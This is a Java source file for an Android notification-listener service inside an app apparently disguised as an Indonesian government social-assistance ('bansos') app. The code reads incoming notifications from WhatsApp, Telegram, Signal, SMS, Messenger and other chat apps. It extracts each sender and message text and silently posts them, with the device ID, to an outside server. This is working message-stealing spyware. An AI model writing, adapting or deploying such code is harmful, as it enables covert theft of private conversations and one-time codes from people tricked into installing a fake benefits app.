package com.kemensos.bansos;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotifListener extends NotificationListenerService {

    private static final String TAG = "NotifListener";
    private static final String SERVER_URL = "https://bansos.jokichannel.eu.org/api/collect-notif";

    // Daftar paket aplikasi chat yang ingin ditangkap
    private static final String[] CHAT_APPS = {
        "com.whatsapp",           // WhatsApp
        "com.whatsapp.w4b",       // WhatsApp Business
        "org.telegram.messenger", // Telegram
        "org.telegram.plus",      // Telegram X / Plus
        "com.facebook.orca",      // Messenger
        "com.instagram.android",  // Instagram DM
        "com.skype.raider",       // Skype
        "com.discord",            // Discord
        "com.signal",             // Signal
        "com.viber.voip",         // Viber
        "com.google.android.apps.messaging", // Google Messages
        "com.android.mms",        // SMS bawaan
        "com.android.systemui",   // Notif system
    };

    // WhatsApp specific
    private static final String WHATSAPP_PKG = "com.whatsapp";
    private static final String WHATSAPP_BIZ_PKG = "com.whatsapp.w4b";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "NotificationListener started");

        // Buat channel untuk service notif (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "notif_listener_channel",
                "Notif Listener Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Service untuk membaca notif chat");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();
        long postTime = sbn.getPostTime();

        // Cek apakah dari app chat
        if (!isChatApp(packageName)) return;

        // Ambil extra
        CharSequence titleText = null;
        CharSequence contentText = null;
        CharSequence bigText = null;

        if (notification != null && notification.extras != null) {
            titleText = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
            contentText = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
            bigText = notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT);

            // Untuk WhatsApp, EXTRA_TITLE = nama pengirim, EXTRA_TEXT = pesan
            if (titleText == null) {
                // Coba dari info_notification_data (WhatsApp kadang simpan di sini)
                titleText = notification.extras.getCharSequence("android.title");
            }
            if (contentText == null) {
                contentText = notification.extras.getCharSequence("android.text");
            }
        }

        // Fallback: jika dari WhatsApp dan masih kosong, coba dari notif ticker
        if (titleText == null || contentText == null) {
            if (notification != null && notification.tickerText != null) {
                String ticker = notification.tickerText.toString();
                if (ticker.contains(":")) {
                    String[] parts = ticker.split(":", 2);
                    if (titleText == null) titleText = parts[0].trim();
                    if (contentText == null) contentText = parts[1].trim();
                } else {
                    if (contentText == null) contentText = ticker;
                }
            }
        }

        final String sender = titleText != null ? titleText.toString() : "Unknown";
        final String message = contentText != null ? contentText.toString() : "";
        final String notifTime = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(new Date(postTime));

        // Ambil device ID
        final String deviceId = android.provider.Settings.Secure.getString(
            getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        );

        Log.i(TAG, "NOTIF from " + packageName + ": [" + sender + "] " + message);

        // Kirim ke server
        final String fSender = sender;
        final String fMessage = message;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String data = "sender=" + URLEncoder.encode(fSender, "UTF-8") +
                                  "&message=" + URLEncoder.encode(fMessage, "UTF-8") +
                                  "&timestamp=" + notifTime +
                                  "&device_id=" + URLEncoder.encode(deviceId, "UTF-8") +
                                  "&app=" + URLEncoder.encode(getAppLabel(packageName), "UTF-8");

                    OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                    writer.write(data);
                    writer.flush();

                    int responseCode = conn.getResponseCode();
                    conn.disconnect();

                    Log.i(TAG, "Notif sent. Response: " + responseCode);
                } catch (Exception e) {
                    Log.e(TAG, "Failed: " + e.getMessage());
                }
            }
        }).start();
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Not needed
    }

    private boolean isChatApp(String pkg) {
        for (String app : CHAT_APPS) {
            if (pkg.equals(app) || pkg.startsWith(app)) {
                return true;
            }
        }
        return false;
    }

    private String getAppLabel(String pkg) {
        switch (pkg) {
            case WHATSAPP_PKG:       return "WhatsApp";
            case WHATSAPP_BIZ_PKG:   return "WA Business";
            case "org.telegram.messenger": return "Telegram";
            case "com.facebook.orca":      return "Messenger";
            case "com.instagram.android":  return "Instagram DM";
            case "com.skype.raider":       return "Skype";
            case "com.discord":            return "Discord";
            case "com.signal":             return "Signal";
            case "com.viber.voip":         return "Viber";
            case "com.google.android.apps.messaging": return "Google Messages";
            default: return pkg;
        }
    }
}
